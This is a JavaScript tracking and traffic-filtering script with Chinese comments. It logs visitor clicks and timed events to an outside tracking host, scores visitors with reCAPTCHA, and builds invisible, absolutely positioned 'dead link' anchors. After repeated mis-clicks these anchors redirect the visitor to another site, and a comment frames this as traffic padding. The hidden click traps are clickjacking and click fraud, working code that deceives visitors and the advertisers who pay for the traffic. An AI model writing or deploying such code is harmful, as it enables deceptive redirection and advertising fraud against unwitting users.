
(function () {
    var domain = 'trk.besthotsite.com'
    var protocol = 'https'
    var errTimeLimit = 2 // 允许错误次数
    var checkUrl = protocol + '://' + domain + '/d/wrong' // 你的追踪的上报错误链接。用于僵尸率
    window.direction = 1 // 死链平铺方向，1向上，2向下
    window.deadLinkNumber = 10 // 每一块死链数
    window.deadLinkWidth = 600// 死链宽度 px
    window.deadLinkHeight = 100 // 死链高度
    window.directUrl = 'http://yeahmiracle.com' // 如果误点达到次数，会往这里跳，刷子啦，自由发挥

    window.afilter = function (event, detail, token) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', protocol + '://' + domain + '/p/events', true);
        xhr.withCredentials = true;
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("et=" + event + "&v=" + detail + "&t=" + token);
        return true
    };
    window.atgo = function (url) {
        window.location.replace(protocol + '://' + domain + '/' + url);
    };
    var e = {
        clicks: {
            clickCount: 0,
            clickWrong: 0,
            clickDetails: []
        }
    };
    window.AtRequest = function (e = "GET", t, n = null, callback = function() {}) {
        var o = new XMLHttpRequest;
        o.open(e, t, !0),
        o.withCredentials = !0,
        n && o.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
        o.send(n)
        o.onreadystatechange = function() {
            if (o.readyState == 4) {
                if(o.status == 200){
                    callback()
                }else{
                    callback()
                }
            }
        }
    },
    window.AtClickCheck = function (t = ["p", "button", "a"], n = 3, o = 0) {
        document.addEventListener("DOMContentLoaded", function () {
            document.addEventListener("mouseup", function (c) {
                e.clicks.clickCount++ ,
                e.clicks.clickDetails.push({
                    timestamp: Date.now(),
                    node: c.target.nodeName,
                    x: c.pageX,
                    y: c.pageY
                }),
                o > 0 && console.log(c.target.nodeName),
                t.indexOf(c.target.nodeName.toLowerCase()) < 0 && e.clicks.clickWrong++ ,
                e.clicks.clickWrong > n && (o > 0 && console.log("Bot"), AtRequest("GET", protocol + '://' + domain + '/d/wrong'))
            })
        })
    }

    window.SlideTo = function(position) {
        window.scrollTo(0, position)
    }


    window.RecordTime = function(timeArr, eventArr) {
        timeArr = timeArr || []
        eventArr = eventArr || []
        var startTime = new Date().getTime()
        if (!window.requestAnimationFrame) {
            requestAnimationFrame = function(fn) {
                setTimeout(fn, 100);
            };
        }
        requestAnimationFrame(function fn() {
            var nowTime = new Date().getTime()
            var second = Math.floor((nowTime - startTime) / 1000)
            var index = timeArr.indexOf(second)
            if(index > -1 && eventArr[index]) {
                afilter(eventArr[index])
                console.log(eventArr[index])
                eventArr[index] = false
            }
            requestAnimationFrame(fn)
        })
    }

    var errTime = 1
    // 死链模板
    window.deadLink = document.createElement('a')
    deadLink.href = directUrl
    deadLink.style = 'display: inline-block;opacity: 0;position: absolute; width: '+ deadLinkWidth+'px;height: '+deadLinkHeight+'px'
    // 死链误点检测
    window.deadUrlCheck = function() {
        if(errTime++ >= errTimeLimit) {
            AtRequest("GET", checkUrl, '', function() { window.location = directUrl })
        }
        return false
    }
})()
window.onload = function () {
    var a = document.createElement('script')
    a.src = 'https://www.recaptcha.net/recaptcha/api.js?render=6LfOt3cUAAAAAMCmwEO6NoLzIGrsk1XvNRJQwooI'
    document.body.append(a)
    a.onload = function () {
        grecaptcha.ready(function () {
            grecaptcha.execute('6LfOt3cUAAAAAMCmwEO6NoLzIGrsk1XvNRJQwooI', { action: 'afilter' })
                .then(function (token) {
                    afilter(6, null, token);
                });
        });
    }
}
